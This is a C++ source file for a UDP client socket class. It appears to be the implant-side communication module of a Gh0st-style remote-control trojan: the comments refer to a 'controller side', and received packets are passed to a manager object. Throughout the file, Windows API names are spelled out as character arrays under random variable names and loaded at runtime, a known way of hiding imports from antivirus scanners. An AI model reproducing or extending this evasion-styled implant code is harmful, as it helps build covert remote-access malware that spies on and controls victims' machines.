#include "stdafx.h"
#include "ClientSocket.h"
#include "common/declare.h"
#include "common/utils.h"
#include "Manager.h"
#include <WS2tcpip.h>
#pragma comment(lib, "ws2_32.lib")

#define	MAX_SEND_BUFFER			1024 * 8 // 最大发送数据长度
#define MAX_RECV_BUFFER			1024 * 8 // 最大接收数据长度

CClientSocket::CClientSocket()
{
	WSADATA wsaData;
	int err = -1;
	char BrmAP22[] = { 'C','r','e','a','t','e','E','v','e','n','t','A','\0' };
	CreateEventAT pCreateEventA = (CreateEventAT)GetProcAddress(LoadLibrary(_T("KERNEL32.dll")), BrmAP22);

	err = WSAStartup(MAKEWORD(2, 2), &wsaData);//初始化

	if (LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2)
	{
		WSACleanup();
	}
	m_hEvent = pCreateEventA(NULL, true, false, NULL);
	m_bIsRunning = false;
	m_Socket = INVALID_SOCKET;
	// Packet Flag;
	//BYTE bPacketFlag[] = { 'K', 'u', 'G', 'o', 'u' };
	//Gyfunction->my_memcpy(m_bPacketFlag, bPacketFlag, sizeof(bPacketFlag));
}

void CClientSocket::setManagerCallBack(CManager *pManager)
{
	m_pManager = pManager;
}

bool CClientSocket::InitSocket(LPCSTR lpszHost, UINT nPort)
{
	// 重置事件对像
	ResetEventT pResetEvent = (ResetEventT)GetProcAddress(LoadLibrary(_T("KERNEL32.dll")), "ResetEvent");
	pResetEvent(m_hEvent);
	m_bIsRunning = false;


	//m_Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	m_Socket = socket(AF_INET, SOCK_DGRAM, 0);
	if (m_Socket == SOCKET_ERROR)
	{
		return false;
	}

	hostent* pHostent = NULL;

	pHostent = gethostbyname(lpszHost);

	if (pHostent == NULL)
		return false;

	// 构造sockaddr_in结构
	//sockaddr_in	ClientAddr;
	ClientAddr.sin_family = AF_INET;

	ClientAddr.sin_port = htons(nPort);

	ClientAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);

	// 	if (connect(m_Socket, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr)) == SOCKET_ERROR)
	// 		return false;
		// 禁用Nagle算法后，对程序效率有严重影响
		// The Nagle algorithm is disabled if the TCP_NODELAY option is enabled 
		//   const char chOpt = 1;
		// 	int nErr = setsockopt(m_Socket, IPPROTO_TCP, TCP_NODELAY, &chOpt, sizeof(char));


		// 不用保活机制，自己用心跳实瑞

	//	const char chOpt = 1; // True
	//	 // Set KeepAlive 开启保活机制, 防止服务端产生死连接
	// 	char DYrEN16[] = { 'W','S','A','I','o','c','t','l','\0' };
	// 	WSAIoctlT pWSAIoctl = (WSAIoctlT)GetProcAddress(LoadLibrary("WS2_32.dll"), DYrEN16);
	// 	if (setsockopt(m_Socket, SOL_SOCKET, SO_KEEPALIVE, (char *)&chOpt, sizeof(chOpt)) == 0)
	// 	{
	// 		// 设置超时详细信息
	// 		tcp_keepalive	klive;
	// 		klive.onoff = 1; // 启用保活
	// 		klive.keepalivetime = 1000 * 60 * 1; // 1分钟超时 Keep Alive
	// 		klive.keepaliveinterval = 1000 * 5; // 重试间隔为5秒 Resend if No-Reply
	// 		pWSAIoctl
	// 			(
	// 				m_Socket,
	// 				SIO_KEEPALIVE_VALS,
	// 				&klive,
	// 				sizeof(tcp_keepalive),
	// 				NULL,
	// 				0,
	// 				(unsigned long *)&chOpt,
	// 				0,
	// 				NULL
	// 				);
	// 	}

	return true;
}

bool CClientSocket::IsRunning()
{
	return m_bIsRunning;
}

void CClientSocket::StartReceiving()
{
	m_bIsRunning = true;
	m_hWorkerThread = (HANDLE)MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL, true);
}

DWORD WINAPI CClientSocket::WorkThread(LPVOID lparam)
{
	CClientSocket *pThis = (CClientSocket *)lparam;
	char	buff[MAX_RECV_BUFFER];
	sockaddr_in RemoteAddr;
	socklen_t addrlen = sizeof(RemoteAddr);
	fd_set fdSocket;
	FD_ZERO(&fdSocket);
	FD_SET(pThis->m_Socket, &fdSocket);
	while (pThis->IsRunning())
	{
		fd_set fdRead = fdSocket;
		int nRet = select(NULL, &fdRead, NULL, NULL, NULL);
		if (nRet == SOCKET_ERROR)
		{
			//pThis->Disconnect();
			break;
		}
		if (nRet > 0)
		{
			memset(buff, 0, sizeof(buff));
			int nSize = recvfrom(pThis->m_Socket, buff, sizeof(buff), 0, (sockaddr *)&RemoteAddr, &addrlen);
			if (nSize <= 0)
			{
				//pThis->Disconnect();
				break;
			}
			if (nSize > 0) pThis->OnRead((LPBYTE)buff, nSize);
		}
	}

	return -1;
}



void CClientSocket::OnRead(LPBYTE lpBuffer, DWORD dwIoSize)
{
	try
	{
		if (dwIoSize == 0)
		{
			Close();
			return;
		}
		m_pManager->OnReceive(lpBuffer, dwIoSize);


	}
	catch (...)
	{
		Send(NULL, 0);
	}

}

int CClientSocket::Send(LPBYTE lpData, UINT nSize, _In_reads_bytes_(tolen) const struct sockaddr FAR * to/*=NULL*/,
	_In_ int tolen/*=NULL*/)
{
	int ret = 0;

#if 0
	if (nSize > 0)
	{
		// Compress data
		unsigned long	destLen = (unsigned long)((double)nSize * 1.001 + 12);
		LPBYTE			pDest = new BYTE[destLen];

		if (pDest == NULL)
			return 0;

		int	nRet = compress(pDest, &destLen, lpData, nSize);	//压缩数据

		if (nRet != Z_OK)
		{
			delete[] pDest;
			return -1;
		}

		//////////////////////////////////////////////////////////////////////////
		LONG nBufLen = destLen + HDR_SIZE;
		// 5 bytes packet flag
		//		m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
		// 4 byte header [Size of Entire Packet]
		m_WriteBuffer.Write((PBYTE)&nBufLen, sizeof(nBufLen));
		// 4 byte header [Size of UnCompress Entire Packet]
		m_WriteBuffer.Write((PBYTE)&nSize, sizeof(nSize));

		m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
		// Write Data
		m_WriteBuffer.Write(pDest, destLen);
		delete[] pDest;


	}
#endif
	// 分块发送
	//return SendWithSplit(m_WriteBuffer.GetBuffer(), m_WriteBuffer.GetBufferLen(), MAX_SEND_BUFFER);
	if (to == NULL)
		ret = SendWithSplit(lpData, nSize, MAX_SEND_BUFFER);
	else
		ret = SendWithSplit(lpData, nSize, MAX_SEND_BUFFER, to, tolen);
	return ret;
}

int CClientSocket::SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize)
{
	int			nRet = 0;
	const char	*pbuf = (char *)lpData;
	unsigned int			size = 0;
	unsigned int			nSend = 0;
	int			nSendRetry = 15;
	int         i = 0;

	// 依次发送
	char FBwWp25[] = { 'S','l','e','e','p','\0' };
	SleepT pSleep = (SleepT)GetProcAddress(LoadLibrary(_T("KERNEL32.dll")), FBwWp25);
	size = nSize;
	if (size > nSplitSize) {
		for (size = nSize; size >= nSplitSize; size -= nSplitSize)
		{
			for (i = 0; i < nSendRetry; i++)
			{
				nRet = sendto(m_Socket, pbuf, nSplitSize, 0, (struct sockaddr *)&ClientAddr, sizeof(ClientAddr));
				if (nRet > 0)
					break;
			}
			if (i == nSendRetry)
				return -1;

			nSend += nRet;
			pbuf += nSplitSize;
			pSleep(10); // 必要的Sleep,过快会引起控制端数据混乱
		}
	}
	// 发送最后的部分
	if (size > 0)
	{
		for (i = 0; i < nSendRetry; i++)
		{
			nRet = sendto(m_Socket, (char *)pbuf, size, 0, (struct sockaddr *)&ClientAddr, sizeof(ClientAddr));
			if (nRet > 0)
				break;
		}
		if (i == nSendRetry)
			return -1;
		nSend += nRet;
	}
	if (nSend == nSize)
		return nSend;
	else
		return SOCKET_ERROR;
}

int CClientSocket::SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize,
	_In_reads_bytes_(tolen) const struct sockaddr FAR * to,
	_In_ int tolen)
{
	int			nRet = 0;
	const char	*pbuf = (char *)lpData;
	unsigned int			size = 0;
	unsigned int			nSend = 0;
	int			nSendRetry = 15;
	int         i = 0;

	// 依次发送
	char FBwWp25[] = { 'S','l','e','e','p','\0' };
	SleepT pSleep = (SleepT)GetProcAddress(LoadLibrary(_T("KERNEL32.dll")), FBwWp25);
	size = nSize;
	if (size > nSplitSize) {
		for (size = nSize; size >= nSplitSize; size -= nSplitSize)
		{
			for (i = 0; i < nSendRetry; i++)
			{
				nRet = sendto(m_Socket, pbuf, nSplitSize, 0, to, tolen);
				if (nRet > 0)
					break;
			}
			if (i == nSendRetry)
				return -1;

			nSend += nRet;
			pbuf += nSplitSize;
			pSleep(10); // 必要的Sleep,过快会引起控制端数据混乱
		}
	}
	// 发送最后的部分
	if (size > 0)
	{
		for (i = 0; i < nSendRetry; i++)
		{
			nRet = sendto(m_Socket, (char *)pbuf, size, 0, to, tolen);
			if (nRet > 0)
				break;
		}
		if (i == nSendRetry)
			return -1;
		nSend += nRet;
	}
	if (nSend == nSize)
		return nSend;
	else
		return SOCKET_ERROR;
}

void CClientSocket::RunEventLoop()
{
	char BrmAP30[] = { 'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t','\0' };
	WaitForSingleObjectT pWaitForSingleObject = (WaitForSingleObjectT)GetProcAddress(LoadLibrary(_T("KERNEL32.dll")), BrmAP30);
	pWaitForSingleObject(m_hEvent, INFINITE);
}

void CClientSocket::Close()
{
	//
	// If we're supposed to abort the connection, set the linger value
	// on the socket to 0.
	//
	LINGER lingerStruct;
	lingerStruct.l_onoff = 1;
	lingerStruct.l_linger = 0;
	setsockopt(m_Socket, SOL_SOCKET, SO_LINGER, (char *)&lingerStruct, sizeof(lingerStruct));

	//	CancelIoT pCancelIo=(CancelIoT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"CancelIo");
	//	pCancelIo((HANDLE) m_Socket);
	char SSzlC21[] = { 'I','n','t','e','r','l','o','c','k','e','d','E','x','c','h','a','n','g','e','\0' };
	InterlockedExchangeT pInterlockedExchange = (InterlockedExchangeT)GetProcAddress(LoadLibrary(_T("KERNEL32.dll")), SSzlC21);
	pInterlockedExchange((LPLONG)&m_bIsRunning, false);
	closesocket(m_Socket);

	char BrmAP23[] = { 'S','e','t','E','v','e','n','t','\0' };
	SetEventT pSetEvent = (SetEventT)GetProcAddress(LoadLibrary(_T("KERNEL32.dll")), BrmAP23);
	pSetEvent(m_hEvent);

	m_Socket = INVALID_SOCKET;
}

CClientSocket::~CClientSocket()
{
	m_bIsRunning = false;
	char BrmAP30[] = { 'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t','\0' };
	WaitForSingleObjectT pWaitForSingleObject = (WaitForSingleObjectT)GetProcAddress(LoadLibrary(_T("KERNEL32.dll")), BrmAP30);
	pWaitForSingleObject(m_hWorkerThread, INFINITE);

	//	if (m_Socket != INVALID_SOCKET)
	//		Disconnect();
	if (m_Socket != INVALID_SOCKET) {
		closesocket(m_Socket);
		char BrmAP23[] = { 'S','e','t','E','v','e','n','t','\0' };
		SetEventT pSetEvent = (SetEventT)GetProcAddress(LoadLibrary(_T("KERNEL32.dll")), BrmAP23);
		pSetEvent(m_hEvent);

		m_Socket = INVALID_SOCKET;
	}
	char BrmAP29[] = { 'C','l','o','s','e','H','a','n','d','l','e','\0' };
	CloseHandleT pCloseHandle = (CloseHandleT)GetProcAddress(LoadLibrary(_T("KERNEL32.dll")), BrmAP29);
	pCloseHandle(m_hWorkerThread);
	pCloseHandle(m_hEvent);
	WSACleanup();
}
